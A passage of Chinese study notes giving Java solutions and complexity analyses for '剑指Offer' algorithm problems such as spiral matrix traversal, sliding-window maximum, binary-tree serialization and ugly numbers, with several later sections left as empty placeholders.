`bottom` 减 1 | 是否 `top > bottom` |\n| 从下向上 | 下边界 `bottom` ，上边界`top` | 左边界 `left` 加 1   | 是否 `left > right` |\n\n```java\nclass Solution {\n    public int[] spiralOrder(int[][] matrix) {\n        if(matrix.length == 0) return new int[0];\n        int left = 0, right = matrix[0].length -1, top = 0, bottom = matrix.length -1, count = 0;\n        int[] res = new int[(right + 1)*(bottom + 1)];\n        while(true){\n            for(int i = left; i <= right; i++){ // 从左到右\n                res[count++] = matrix[top][i];\n            }\n            if(++top > bottom) break;\n            for(int i = top; i <= bottom; i++){ // 从上到下\n                res[count++] = matrix[i][right];\n            }\n            if(left > --right) break;\n            for(int i = right; i >= left; i--){ // 从右到左\n                res[count++] = matrix[bottom][i];\n            }\n            if(top > --bottom) break;\n            for(int i = bottom; i >= top; i--){ // 从下到上\n                res[count++] = matrix[i][left];\n            }\n            if(++left > right) break;\n        }\n        return res;\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(MN)：** M,N 分别为矩阵行数和列数。\n-   **空间复杂度 O(1) ：** 四个边界使用常数大小的 **额外** 空间（ `res` 为必须使用的空间）。\n\n## 31. 栈的压入、弹出序列\n\n### 题目\n\n>输入两个整数序列，第一个序列表示栈的压入顺序，请判断第二个序列是否为该栈的弹出顺序。假设压入栈的所有数字均不相等。例如，序列 {1,2,3,4,5} 是某栈的压栈序列，序列 {4,5,3,2,1} 是该压栈序列对应的一个弹出序列，但 {4,3,5,1,2} 就不可能是该压栈序列的弹出序列。\n>\n>示例 1：\n>\n>```\n>输入：pushed = [1,2,3,4,5], popped = [4,5,3,2,1]\n>输出：true\n>解释：我们可以按以下顺序执行：\n>push(1), push(2), push(3), push(4), pop() -> 4,\n>push(5), pop() -> 5, pop() -> 3, pop() -> 2, pop() -> 1\n>```\n>\n>示例 2：\n>\n>```\n>输入：pushed = [1,2,3,4,5], popped = [4,3,5,1,2]\n>输出：false\n>解释：1 不能在 2 之前弹出。\n>```\n\n### 解答\n\n考虑借用一个辅助栈 stack ，**模拟** 压入 / 弹出操作的排列。根据是否模拟成功，即可得到结果。\n\n-   **入栈操作：** 按照压栈序列的顺序执行。\n-   **出栈操作：** 每次入栈后，循环判断 “**栈顶元素 \\=\\=\\= 弹出序列的当前元素**” 是否成立，将符合弹出序列顺序的栈顶元素全部弹出。\n\n**算法流程：**\n\n1.  **初始化：** 辅助栈 stack，弹出序列的索引 i ；\n2.  **遍历压栈序列：** 各元素记为 num ；\n    1.  元素 num 入栈；\n    2.  循环出栈：若 stack 的栈顶元素 \\=\\=\\= 弹出序列元素 popped\\[i\\] ，则执行出栈与 i++ ；\n3.  **返回值：** 若 stack 为空，则此弹出序列合法。\n\n```java\nclass Solution {\n    public boolean validateStackSequences(int[] pushed, int[] popped) {\n        Stack<Integer> stack = new Stack<>();\n        int i = 0;\n        for(int num : pushed) {\n            stack.push(num); // num 入栈\n            while(!stack.isEmpty() && stack.peek() == popped[i]) { // 循环判断与出栈\n                stack.pop();\n                i++;\n            }\n        }\n        return stack.isEmpty();\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(N) ：** 其中 N 为列表 pushed 的长度；每个元素最多入栈与出栈一次，即最多共 2N 次出入栈操作。\n-   **空间复杂度 O(N) ：** 辅助栈 stack 最多同时存储 N 个元素。\n\n# 第 26 天 字符串（中等）\n\n## 20. 表示数值的字符串\n\n### 题目\n\n>请实现一个函数用来判断字符串是否表示**数值**（包括整数和小数）。\n>\n>**数值**（按顺序）可以分成以下几个部分：\n>\n>1.  若干空格\n>2.  一个 **小数** 或者 **整数**\n>3.  （可选）一个 `'e'` 或 `'E'` ，后面跟着一个 **整数**\n>4.  若干空格\n>\n>**小数**（按顺序）可以分成以下几个部分：\n>\n>1.  （可选）一个符号字符（`'+'` 或 `'-'`）\n>2.  下述格式之一：\n>    1.  至少一位数字，后面跟着一个点 `'.'`\n>    2.  至少一位数字，后面跟着一个点 `'.'` ，后面再跟着至少一位数字\n>    3.  一个点 `'.'` ，后面跟着至少一位数字\n>\n>**整数**（按顺序）可以分成以下几个部分：\n>\n>1.  （可选）一个符号字符（`'+'` 或 `'-'`）\n>2.  至少一位数字\n>\n>部分**数值**列举如下：\n>\n>-   `[\"+100\", \"5e2\", \"-123\", \"3.1416\", \"-1E-16\", \"0123\"]`\n>\n>部分**非数值**列举如下：\n>\n>-   `[\"12e\", \"1a3.14\", \"1.2.3\", \"+-5\", \"12e+5.4\"]`\n>\n>示例 1：\n>\n>```\n>输入：s = \"0\"\n>输出：true\n>```\n>\n>示例 2：\n>\n>```\n>输入：s = \"e\"\n>输出：false\n>```\n>\n>示例 3：\n>\n>```\n>输入：s = \".\"\n>输出：false\n>```\n>\n>示例 4：\n>\n>```\n>输入：s = \"    .1  \"\n>输出：true\n>```\n\n### 解答\n\n#### 方法1：暴力\n\n```java\nclass Solution {\n    public boolean isNumber(String s) {\n        if (s == null || s.length() == 0) return false;// s为空对象或s长度为0,不表示数值\n        //是否出现数字、小数点、e或者E\n        boolean numFlag = false, dotFlag = false, eFlag = false;\n        //去掉首尾空格\n        s = s.trim();\n        for (int i = 0; i < s.length(); i++) {\n            //判定为数字，则标记numFlag\n            if (s.charAt(i) >= '0' && s.charAt(i) <= '9') {\n                numFlag = true;\n                //小数点只可以出现再e之前，且只能出现一次.num  num.num num.都是被允许的\n            } else if (s.charAt(i) == '.' && !dotFlag && !eFlag) {\n                dotFlag = true;\n                //判定为e，需要没出现过e，并且出过数字了\n            } else if ((s.charAt(i) == 'e' || s.charAt(i) == 'E') && !eFlag && numFlag) {\n                eFlag = true;\n                numFlag = false;//重置，避免e以后没有出现数字，防止出现123e或者123e+的非法情况\n                //判定为+-符号，只能出现在第一位或者紧接e后面\n            } else if (s.charAt(i) == '+' || s.charAt(i) == '-') {\n                if(i != 0 && s.charAt(i - 1) != 'e' && s.charAt(i - 1) != 'E') \n                  return false; \n            } else return false;//其他情况，都是非法的\n        }\n        //是否出现了数字 \n        return numFlag;\n    }\n}\n```\n\n### 复杂度\n\n- 时间复杂度：O(n)\n- 空间复杂度：O(1)\n\n## 67. 把字符串转换成整数\n\n### 题目\n\n>写一个函数 StrToInt，实现把字符串转换成整数这个功能。不能使用 atoi 或者其他类似的库函数。\n>\n>首先，该函数会根据需要丢弃无用的开头空格字符，直到寻找到第一个非空格的字符为止。\n>\n>当我们寻找到的第一个非空字符为正或者负号时，则将该符号与之后面尽可能多的连续数字组合起来，作为该整数的正负号；假如第一个非空字符是数字，则直接将其与之后连续的数字字符组合起来，形成整数。\n>\n>该字符串除了有效的整数部分之后也可能会存在多余的字符，这些字符可以被忽略，它们对于函数不应该造成影响。\n>\n>注意：假如该字符串中的第一个非空格字符不是一个有效整数字符、字符串为空或字符串仅包含空白字符时，则你的函数不需要进行转换。\n>\n>在任何情况下，若函数不能进行有效的转换时，请返回 0。\n>\n>**说明：**\n>\n>假设我们的环境只能存储 32 位大小的有符号整数，那么其数值范围为 \\[−2<sup>31</sup>,  2<sup>31</sup> − 1\\]。如果数值超过这个范围，请返回  INT\\_MAX (2<sup>31</sup> − 1) 或 INT\\_MIN (−2<sup>31</sup>) 。\n>\n>**示例 1:**\n>\n>```\n>输入: \"42\"\n>输出: 42\n>```\n>\n>**示例 2:**\n>\n>```\n>输入: \"   -42\"\n>输出: -42\n>解释: 第一个非空白字符为 '-', 它是一个负号。\n>     我们尽可能将负号与后面所有连续出现的数字组合起来，最后得到 -42 。\n>```\n>\n>**示例 3:**\n>\n>```\n>输入: \"4193 with words\"\n>输出: 4193\n>解释: 转换截止于数字 '3' ，因为它的下一个字符不为数字。\n>```\n>\n>**示例 4:**\n>\n>```\n>输入: \"words and 987\"\n>输出: 0\n>解释: 第一个非空字符是 'w', 但它不是数字或正、负号。\n>因此无法执行有效的转换。\n>```\n>\n>**示例 5:**\n>\n>```\n>输入: \"-91283472332\"\n>输出: -2147483648\n>解释: 数字 \"-91283472332\" 超过 32 位有符号整数范围。 \n>因此返回 INT_MIN (−2^31) 。\n>```\n\n### 解答\n\n![](https://img.jwt1399.top/img/202209071354147.png)\n\n![](https://img.jwt1399.top/img/202209071404320.png)\n\n需要保证本次循环的 `res * 10 + chars[j]` 不超过 int 即可保证不越界\n\n- `res > bndry` 意思是，此时 res 已经大于 bndry 了，* 10 一定越界\n- `res == bndry && chars[j] > '7'` 的意思是，当 res == bndry 时，即：214748364 此时 res * 10 变成 2147483640 此时没越界，但是还需要 + chars[j]，而 int 最大值为 2147483647，所以当chars[j] > 7 时会越界\n\n```java\nclass Solution {\n        public int strToInt(String str) {\n            //去前后空格\n            char[] chars = str.trim().toCharArray();\n            if (chars.length == 0) return 0;\n            //记录第一个符合是否为负数\n            int sign = 1;\n            //开始遍历的位置\n            int i = 1;\n            //如果首个非空格字符为负号，那么从位置1开始遍历字符串，并且结果需要变成负数\n            if (chars[0] == '-') {\n                sign = -1;\n            } else if (chars[0] != '+') { //如果首个非空格字符不是负号也不是加号，从第一个元素开始遍历\n                i = 0;\n            }\n            int bndry = Integer.MAX_VALUE / 10; // 214748364\n            int res = 0;\n            for (int j = i; j < chars.length; j++) {\n                //遇到非数字直接退出\n                if (chars[j] > '9' || chars[j] < '0') break;\n                //判断是否越界 2^31−1 = 2147483647\n                if (res > bndry || (res == bndry && chars[j] > '7')) {\n                    //根据字符串首负号判断返回最大值还是最小值\n                    return sign == 1 ? Integer.MAX_VALUE : Integer.MIN_VALUE;\n                }\n                //字符转数字：“此数字的ASCII码”与“0的ASCII码”相减即可\n                res = res * 10 + (chars[j] - '0');\n            }\n            //返回结果，需要判断正负\n            return res * sign;\n        }\n    }\n```\n\n### 复杂度\n\n-   **时间复杂度 O(N) ：** 其中 N 为字符串长度，线性遍历字符串占用 O(N) 时间。\n-   **空间复杂度 O(N) ：** 删除首尾空格后需建立新字符串，最差情况下占用 O(N) 额外空间。\n\n# 第 27 天 栈与队列（困难）\n\n## 59 - I. 滑动窗口的最大值\n\n### 题目\n\n>给定一个数组 `nums` 和滑动窗口的大小 `k`，请找出所有滑动窗口里的最大值。\n>\n>**示例:**\n>\n>```\n>输入: nums = [1,3,-1,-3,5,3,6,7], 和 k = 3\n>输出: [3,3,5,5,6,7] \n>解释: \n>\n>  滑动窗口的位置                最大值\n>---------------               -----\n>[1  3  -1] -3  5  3  6  7       3\n> 1 [3  -1  -3] 5  3  6  7       3\n> 1  3 [-1  -3  5] 3  6  7       5\n> 1  3  -1 [-3  5  3] 6  7       5\n> 1  3  -1  -3 [5  3  6] 7       6\n> 1  3  -1  -3  5 [3  6  7]      7\n>```\n\n### 解答\n\n窗口对应的数据结构为 **双端队列** ，本题使用 **单调队列** 解决问题。遍历数组时，每轮保证单调队列 deque：\n\n1.  deque 内 **仅包含窗口内的元素** ⇒ 每轮窗口滑动移除了元素 nums\\[i−1\\]，需将 deque 内的对应元素一起删除。\n2.  deque 内的元素 **非严格递减** ⇒ 每轮窗口滑动添加了元素 nums\\[j+1] ，需将 deque 内所有 <nums\\[j+1\\]的元素删除。\n\n##### 算法流程：\n\n1.  **初始化：** 双端队列 deque，结果列表 res ，数组长度 n ；\n2.  **滑动窗口：** 左边界范围 i∈\\[1−k,n−k\\]，右边界范围 j∈\\[0,n−1\\] ；\n    1.  若 i\\>0 且 队首元素 deque\\[0] = 被删除元素 nums\\[i−1\\] ，则队首元素出队；\n    2.  删除 deque 内所有 <nums\\[j\\] 的元素，以保持 deque 递减；\n    3.  将 nums\\[j\\] 添加至 deque 尾部；\n    4.  若已形成窗口（即 i≥0 ）：将窗口最大值（即队首元素 deque\\[0]）添加至列表 res ；\n3.  **返回值：** 返回结果列表 res ；\n\n```java\nclass Solution {\n    public int[] maxSlidingWindow(int[] nums, int k) {\n        if(nums.length == 0 || k == 0) return new int[0];\n        Deque<Integer> deque = new LinkedList<>();\n        int[] res = new int[nums.length - k + 1];\n        for(int j = 0, i = 1 - k; j < nums.length; i++, j++) {\n            // 删除 deque 中对应的 nums[i-1]\n            if(i > 0 && deque.peekFirst() == nums[i - 1])\n                deque.removeFirst();\n            // 保持 deque 递减\n            while(!deque.isEmpty() && deque.peekLast() < nums[j])\n                deque.removeLast();\n            deque.addLast(nums[j]);\n            // 记录窗口最大值\n            if(i >= 0)\n                res[i] = deque.peekFirst();\n        }\n        return res;\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(n) ：** 其中 n 为数组 nums 长度；线性遍历 nums 占用 O(n) ；每个元素最多仅入队和出队一次，因此单调队列 deque 占用 O(2n)。\n-   **空间复杂度 O(k)：** 双端队列 deque 中最多同时存储 k 个元素（即窗口大小）。\n\n## 59 - II. 队列的最大值\n\n### 题目\n\n>请定义一个队列并实现函数 `max_value` 得到队列里的最大值，要求函数`max_value`、`push_back` 和 `pop_front` 的**均摊**时间复杂度都是O(1)。\n>\n>若队列为空，`pop_front` 和 `max_value` 需要返回 -1\n>\n>**示例 1：**\n>\n>```\n>输入: \n>[\"MaxQueue\",\"push_back\",\"push_back\",\"max_value\",\"pop_front\",\"max_value\"]\n>[[],[1],[2],[],[],[]]\n>输出: [null,null,null,2,1,2]\n>\n>```\n>\n>**示例 2：**\n>\n>```\n>输入: \n>[\"MaxQueue\",\"pop_front\",\"max_value\"]\n>[[],[],[]]\n>输出: [null,-1,-1]\n>\n>```\n\n### 解答\n\n考虑构建一个递减列表来保存队列所有递减的元素 ，递减队列随着入队和出队操作实时更新，这样队列最大元素就始终对应递减列表的首元素，实现了获取最大值 O(1)时间复杂度。\n\n![](https://img.jwt1399.top/img/202209082127707.png)\n\n为了实现此递减列表，需要使用 **双向队列** ，假设队列已经有若干元素：\n\n1.  当执行入队 `push_back()` 时： 若入队一个比队列某些元素更大的数字 x ，则为了保持此列表递减，需要将双向队列 **尾部所有小于 x 的元素** 弹出。\n2.  当执行出队 `pop_front()` 时： 若出队的元素是最大元素，则 双向队列 需要同时 **将首元素出队** ，以保持队列和双向队列的元素一致性。\n\n##### 函数设计：\n\n初始化队列 `queue` ，双向队列 `deque` ；\n\n**最大值 `max_value()` ：**\n\n-   当双向队列 `deque` 为空，则返回 −1 ；\n-   否则，返回 `deque` 首元素；\n\n**入队 `push_back()` ：**\n\n1.  将元素 `value` 入队 `queue` ；\n2.  将双向队列中队尾 **所有** 小于 `value` 的元素弹出（以保持 `deque` 非单调递减），并将元素 `value` 入队 `deque` ；\n\n**出队 `pop_front()` ：**\n\n1.  若队列 `queue` 为空，则直接返回 −1 ；\n2.  否则，将 `queue` 首元素出队；\n3.  若 `deque` 首元素和 `queue` 首元素 **相等** ，则将 `deque` 首元素出队（以保持两队列 **元素一致** ） ；\n\n```java\nclass MaxQueue {\n    Queue<Integer> queue;\n    Deque<Integer> deque;\n    public MaxQueue() {\n      queue = new LinkedList<>();\n      deque = new LinkedList<>();\n    }\n    \n    public int max_value() {\n      return deque.isEmpty() ? -1 : deque.peekFirst();\n    }\n    //入队\n    public void push_back(int value) {\n      queue.add(value);      // queue.offer(value);\n      while(!deque.isEmpty() && deque.peekLast() < value)\n        deque.removeLast(); // deque.pollLast();\n      deque.addLast(value); // deque.offerLast(value);\n    }\n    //出队\n    public int pop_front() {\n      if(queue.isEmpty()) return -1;\n      // queue 里面保存的是 Integer 而非 int ，peek() 返回的是 Integer 类型，没有自动拆箱，因此需要用 equals() 来比~\n      if(queue.peek().equals(deque.peekFirst()))\n      \tdeque.removeFirst(); // deque.pollFirst();\n      return queue.remove(); // queue.poll();\n    }\n}\n\n/**\n * Your MaxQueue object will be instantiated and called as such:\n * MaxQueue obj = new MaxQueue();\n * int param_1 = obj.max_value();\n * obj.push_back(value);\n * int param_3 = obj.pop_front();\n */\n```\n\n### 复杂度\n\n-   **时间复杂度 O(1) ：** `max_value()`, `push_back()`, `pop_front()` 方法的均摊时间复杂度均为 O(1) ；\n-   **空间复杂度 O(N) ：** 当元素个数为 N 时，最差情况下`deque` 中保存 N 个元素，使用 O(N) 的额外空间；\n\n# 第 28 天 搜索与回溯算法（困难）\n\n## 37. 序列化二叉树\n\n### 题目\n\n>请实现两个函数，分别用来序列化和反序列化二叉树。\n>\n>你需要设计一个算法来实现二叉树的序列化与反序列化。这里不限定你的序列 / 反序列化算法执行逻辑，你只需要保证一个二叉树可以被序列化为一个字符串并且将这个字符串反序列化为原始的树结构。\n>\n>**提示：**输入输出格式与 LeetCode 目前使用的方式一致，详情请参阅 [LeetCode 序列化二叉树的格式](https://support.leetcode-cn.com/hc/kb/article/1567641/)。你并非必须采取这种方式，你也可以采用其他的方法解决这个问题。\n>\n>**示例：**\n>\n>![](https://img.jwt1399.top/img/202209091241895.jpg)\n>\n>```\n>输入：root = [1,2,3,null,null,4,5]\n>输出：[1,2,3,null,null,4,5]\n>```\n\n### 解答\n\n#### 方法1：DFS\n\n-   **序列化**\n\n1.  递归的第一步都是特例的处理，因为这是递归的中止条件：如果根节点为空，返回”null“\n2.  序列化的结果为：根节点值 + \",\" + 左子节点值(进入递归) + \",\" + 右子节点值(进入递归)\n3.  递归就是不断将“根节点”值加到结果中的过程\n\n-   **反序列化**\n\n1.  先将字符串转换成队列\n2.  接下来就进入了递归 \n    i. 弹出左侧元素，即队列出队 \n    ii. 如果元素为“null”，返回null\n    iii. 否则，新建一个节点，其值为弹出元素 \n    iv. 其左子节点为队列的下一个元素，进入递归；右子节点为队列的下下个元素，也进入递归 \n    v. 递归就是不断将子树的根节点连接到父节点的过程\n\n```java\npublic class Codec {\n  \n  // Encodes a tree to a single string.\n  public String serialize(TreeNode root) {\n      if(root == null) return \"null,\";\n      String res = root.val + \",\";\n      res += serialize(root.left);\n      res += serialize(root.right);\n      return res;\n  }\n\n  // Decodes your encoded data to tree.\n  public TreeNode deserialize(String data) {\n      String[] arr = data.split(\",\");\n      Queue<String> queue = new LinkedList<String>();\n      for(int i = 0; i < arr.length; i++){\n          queue.offer(arr[i]);\n      }\n      return dfs(queue);\n  }\n  public TreeNode dfs(Queue<String> queue){\n      String val = queue.poll();\n      if(val.equals(\"null\")) return null;\n      TreeNode root = new TreeNode(Integer.valueOf(val));\n      root.left = dfs(queue);\n      root.right = dfs(queue);\n      return root;\n  }\n}\n\n//优化\npublic class Codec {\n\n    // Encodes a tree to a single string.\n    public String serialize(TreeNode root) {\n        if(root == null) return \"null\";\n        return root.val + \",\" + serialize(root.left) + \",\" + serialize(root.right);  \n    }\n\n    // Decodes your encoded data to tree.\n    public TreeNode deserialize(String data) {\n        Queue<String> queue = new LinkedList<>(Arrays.asList(data.split(\",\")));\n        return dfs(queue);\n    }\n\n    private TreeNode dfs(Queue<String> queue) {\n        String val = queue.poll();\n        if(\"null\".equals(val)) return null;\n        TreeNode root = new TreeNode(Integer.parseInt(val));\n        root.left = dfs(queue);\n        root.right = dfs(queue);\n        return root;\n    }\n}\n```\n\n#### 方法2：BFS\n\n-   **序列化**\n\n1.  用BFS遍历树，与一般遍历的不同点是不管node的左右子节点是否存在，统统加到队列中\n2.  在节点出队时，如果节点不存在，在返回值res中加入一个\"null\"；如果节点存在，则加入节点值的字符串形式\n\n-   **反序列化**\n\n1.  同样使用BFS方法，利用队列新建二叉树\n2.  首先要将data转换成列表，然后遍历，只要不为null将节点按顺序加入二叉树中；同时还要将节点入队\n3.  队列为空时遍历完毕，返回根节点\n\n```java\npublic class Codec {\n\n    // Encodes a tree to a single string.\n    public String serialize(TreeNode root) {\n        if(root == null){\n            return \"[]\";\n        }\n        StringBuilder res = new StringBuilder();\n        res.append(\"[\");\n        Queue<TreeNode> queue = new LinkedList<>();\n        queue.offer(root);\n        while(!queue.isEmpty()){\n            TreeNode node = queue.poll();\n            if (node != null){\n                res.append(node.val);\n                queue.offer(node.left);\n                queue.offer(node.right);\n            }else {\n                res.append(\"null\");\n            }\n            res.append(\",\");\n        }\n        res.append(\"]\");\n        return res.toString();\n    }\n\n    // Decodes your encoded data to tree.\n    public TreeNode deserialize(String data) {\n        if(data == \"[]\"){\n            return null;\n        }\n        String[] dataList = data.substring(1, data.length() - 1).split(\",\");\n        TreeNode root = new TreeNode(Integer.parseInt(dataList[0]));\n        Queue<TreeNode> queue = new LinkedList<>();\n        queue.offer(root);\n        int i = 1;\n        while(!queue.isEmpty()){\n            TreeNode node = queue.poll();\n            if(!dataList[i].equals(\"null\")){\n                node.left = new TreeNode(Integer.parseInt(dataList[i]));\n                queue.offer(node.left);\n            }\n            i++;\n            if(!dataList[i].equals(\"null\")){\n                node.right = new TreeNode(Integer.parseInt(dataList[i]));\n                queue.offer(node.right);\n            }\n            i++;\n        }\n        return root;\n    }\n}\n```\n\n### 复杂度\n\n方法1\n\n- 时间复杂度：O(n)\n- 空间复杂度：O(n)\n\n方法2\n\n- 时间复杂度：O(n)\n- 空间复杂度：O(n)\n\n## 38. 字符串的排列\n\n### 题目\n\n>输入一个字符串，打印出该字符串中字符的所有排列。\n>\n>你可以以任意顺序返回这个字符串数组，但里面不能有重复元素。\n>\n>**示例:**\n>\n>```\n>输入：s = \"abc\"\n>输出：[\"abc\",\"acb\",\"bac\",\"bca\",\"cab\",\"cba\"]\n>```\n\n### 解答\n\n\n\n```java\n\n```\n\n### 复杂度\n\n# 第 29 天 动态规划（困难）\n\n## 19. 正则表达式匹配\n\n### 题目\n\n>请实现一个函数用来匹配包含`'. '`和`'*'`的正则表达式。模式中的字符`'.'`表示任意一个字符，而`'*'`表示它前面的字符可以出现任意次（含0次）。在本题中，匹配是指字符串的所有字符匹配整个模式。例如，字符串`\"aaa\"`与模式`\"a.a\"`和`\"ab*ac*a\"`匹配，但与`\"aa.a\"`和`\"ab*a\"`均不匹配。\n>\n>**示例 1:**\n>\n>```\n>输入:\n>s = \"aa\"\n>p = \"a\"\n>输出: false\n>解释: \"a\" 无法匹配 \"aa\" 整个字符串。\n>\n>```\n>\n>**示例 2:**\n>\n>```\n>输入:\n>s = \"aa\"\n>p = \"a*\"\n>输出: true\n>解释: 因为 '*' 代表可以匹配零个或多个前面的那一个元素, 在这里前面的元素就是 'a'。因此，字符串 \"aa\" 可被视为 'a' 重复了一次。\n>\n>```\n>\n>**示例 3:**\n>\n>```\n>输入:\n>s = \"ab\"\n>p = \".*\"\n>输出: true\n>解释: \".*\" 表示可匹配零个或多个（'*'）任意字符（'.'）。\n>\n>```\n>\n>**示例 4:**\n>\n>```\n>输入:\n>s = \"aab\"\n>p = \"c*a*b\"\n>输出: true\n>解释: 因为 '*' 表示零个或多个，这里 'c' 为 0 个, 'a' 被重复一次。因此可以匹配字符串 \"aab\"。\n>\n>```\n>\n>**示例 5:**\n>\n>```\n>输入:\n>s = \"mississippi\"\n>p = \"mis*is*p*.\"\n>输出: false\n>```\n>\n>-   `s` 可能为空，且只包含从 `a-z` 的小写字母。\n>-   `p` 可能为空，且只包含从 `a-z` 的小写字母以及字符 `.` 和 `*`，无连续的 `'*'`。\n\n### 解答\n\n\n\n```java\n\n```\n\n### 复杂度\n\n## 49. 丑数\n\n### 题目\n\n>我们把只包含质因子 2、3 和 5 的数称作丑数（Ugly Number）。求按从小到大的顺序的第 n 个丑数。\n>\n>示例:\n>\n>```\n>输入: n = 10\n>输出: 12\n>解释: 1, 2, 3, 4, 5, 6, 8, 9, 10, 12 是前 10 个丑数。\n>```\n\n### 解答\n\n丑数的递推性质： 丑数只包含因子 2, 3, 5 ，因此有 “丑数 == 某较小丑数× 2/3/5” 。\n\n设已知长度为 n 的丑数序列 x<sub>1</sub>, x<sub>2</sub>, ⋯ , x<sub>n</sub> ，求第 n+1 个丑数 x<sub>n+1</sub>。根根据递推性质，丑数  x<sub>n+1</sub> 只可能是以下三种情况其中之一（索引 a,b,c 为未知数）：\n\n![](../images/LeetCode-剑指offer/image-20220913140851459.png)\n\n**丑数递推公式：** 若索引 a,b,c 满足以上条件，则下个丑数  x<sub>n+1</sub> = min⁡(x<sub>a</sub>×2, x<sub>b</sub>×3, x<sub>c</sub>×5)\n\n因此，可设置指针 a,b,c 指向首个丑数（即 1 ），循环根据递推公式得到下个丑数，并每轮将对应指针执行 +1 即可。\n\n##### 动态规划解析：\n\n-   **状态定义：** 设动态规划列表 dp ，dp\\[i\\] 代表第 i+1 个丑数；\n-   **转移方程：**\n    1.  当索引 a,b,c 满足以下条件时， dp\\[i] 为三种情况的最小值；\n    2.  每轮计算 dp\\[i] = min⁡(dp\\[a]×2, dp\\[b]×3, dp\\[c]×5) 后，需要更新索引 a,b,c 的值。实现方法：**分别独立判断** dp\\[i\\] 和 dp\\[a\\]×2 , dp\\[b\\]×3 , dp\\[c\\]×5 的大小关系，若相等则将对应索引 a , b , c 加 1 ；\n\n-   **初始状态：** dp\\[0\\]\\=1 ，即第一个丑数为 1 ；\n-   **返回值：** dp\\[n−1\\]，即返回第 n 个丑数；\n\n```java\nclass Solution {\n  public int nthUglyNumber(int n){\n    int a = 0, b = 0, c = 0;\n    int[] dp = new int[n];\n    dp[0] = 1;\n    for(int i = 1; i < n; i++){\n      int x = dp[a] * 2, y = dp[b] * 3, z = dp[c] * 5;\n      dp[i] = Math.min(Math.min(x,y),z);\n      if(dp[i] == x) a++;\n      if(dp[i] == y) b++;\n      if(dp[i] == z) c++;\n    }\n    return dp[n-1];\n  }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(N) ：** 其中 N\\=n ，动态规划需遍历计算 dp 列表。\n-   **空间复杂度 O(N) ：** 长度为 N 的 dp 列表使用 O(N) 的额外空间。\n\n## 60. n个骰子的点数\n\n### 题目\n\n>把n个骰子扔在地上，所有骰子朝上一面的点数之和为s。输入n，打印出s的所有可能的值出现的概率。\n>\n>你需要用一个浮点数数组返回答案，其中第 i 个元素代表这 n 个骰子所能掷出的点数集合中第 i 小的那个的概率。\n>\n>示例 1:\n>\n>```\n>输入: 1\n>输出: [0.16667,0.16667,0.16667,0.16667,0.16667,0.16667]\n>```\n>\n>示例 2:\n>\n>```\n>输入: 2\n>输出: [0.02778,0.05556,0.08333,0.11111,0.13889,0.16667,0.13889,0.11111,0.08333,0.05556,0.02778]\n>```\n\n### 解答\n\n现在有 `n` 个骰子，点数和的范围为 [n, 6n] ，长度为 6n - n + 1 = 5n + 1，扔出点数 `x` 的概率是多少？\n\n首先，`1` 个骰子能扔出的点数是 `1~6`，那么 `n` 个骰子扔出点数 `x` 的概率就可以通过 `n-1` 个骰子扔出点数 `x-1, x-2,... x-6` 的概率分别乘以 1/6 再相加得到。\n\n如果定义一个 `f(n, x)` 函数表示用 n 个骰子抛出 x 点数的概率，那么这个状态转移关系如下：\n\n![](https://img.jwt1399.top/img/202209151252298.png)\n\n`f(n−1,x−i)`中的 `x−i` 会有越界问题。例如，若希望递推计算 `f(2,2)`，由于一个骰子的点数和范围为 \\[1,6\\] ，因此只应求和 f(1,1) ，即 `f(1,0), f(1,−1), ..., f(1,−4)` 皆无意义。因此需要 `x−i > 0` \n\n```java\n// 自底向上的迭代解法\nclass Solution {\n    public double[] dicesProbability(int n) {\n        // n 个骰子可能扔出的结果的最大值和最小值\n        int min = n, max = n * 6;\n        // 定义：用 n 个骰子，凑出 x 的点数的概率是 dp[n][x]\n        double[][] dp = new double[n + 1][max + 1];\n        // 一个骰子扔出点数 1~6 的概率是 1/6\n        for (int j = 1; j <= 6; j++) {\n            dp[1][j] = 1 / 6.0;\n        }\n        // 状态转移\n        for (int i = 2; i <= n; i++) {\n            for (int j = i * 1; j <= i * 6; j++) {\n                for (int k = 1; k <= 6; k++) {\n                    if (j - k <= 0) {\n                        break;\n                    }\n                    // i 个骰子扔出点数 j 的概率\n                    // 可以通过 i - 1 个骰子扔出点数 j - k 的概率推倒出来\n                    dp[i][j] += dp[i - 1][j - k] * 1 / 6.0;\n                }\n            }\n        }\n        //点数和的范围为 [n, 6n] ，长度为 6n - n + 1 = 5n + 1\n        double[] res = new double[max - min + 1];\n        for (int i = 0; i < res.length; i++) {\n            res[i] = dp[n][min + i];\n        }\n        return res;\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(n<sup>2</sup>) ：** 状态转移循环 n−1 轮；每轮中，当 i \\= 2,3,...,n 时，对应循环数量分别为 6×6,11×6,...,\\(5n+1)×6 ；因此总体复杂度为 O((n−1)×{[6+(5n+1)]/2}×6)，即等价于O(n<sup>2</sup>) 。\n-   **空间复杂度 O(n<sup>2</sup>)：**n*(5n+1)\n\n# 第 30 天 分治算法（困难）\n\n## 17. 打印从1到最大的n位数\n\n### 题目\n\n>输入数字 `n`，按顺序打印出从 1 到最大的 n 位十进制数。比如输入 3，则打印出 1、2、3 一直到最大的 3 位数 999。\n>\n>**示例 1:**\n>\n>```\n>输入: n = 1\n>输出: [1,2,3,4,5,6,7,8,9]\n>```\n>\n\n### 解答\n\n如果不考虑大数问题，找出右边界，然后循环即可！！\n\n```java\nclass Solution {\n    public int[] printNumbers(int n) {\n        int end = (int)Math.pow(10,n) - 1; \n        int[] res = new int[end];\n        for(int i = 0; i < end; i++){\n            res[i] = i + 1;\n        }\n        return res;\n    }\n}\n```\n\n考虑大数越界情况\n\n。。。。\n\n### 复杂度\n\n-   **时间复杂度 O(10<sup>n</sup>) ：** 生成长度为 10<sup>n</sup> 的列表需使用 O(10<sup>n</sup>) 时间。\n-   **空间复杂度 O(1) ：** 建立列表需使用 O(1) 大小的额外空间（ 列表作为返回结果，不计入额外空间 ）。\n\n## 51. 数组中的逆序对\n\n### 题目\n\n>\n\n### 解答\n\n\n\n```java\n\n```\n\n### 复杂度\n\n# 第 31 天 数学（困难）\n\n## 14- II. 剪绳子 II\n\n### 题目\n\n>\n\n### 解答\n\n\n\n```java\n\n```\n\n### 复杂度\n\n## 43. 1～n 整数中 1 出现的次数\n\n### 题目\n\n>\n\n### 解答\n\n\n\n```java\n\n```\n\n### 复杂度\n\n## 44. 数字序列中某一位的数字\n\n### 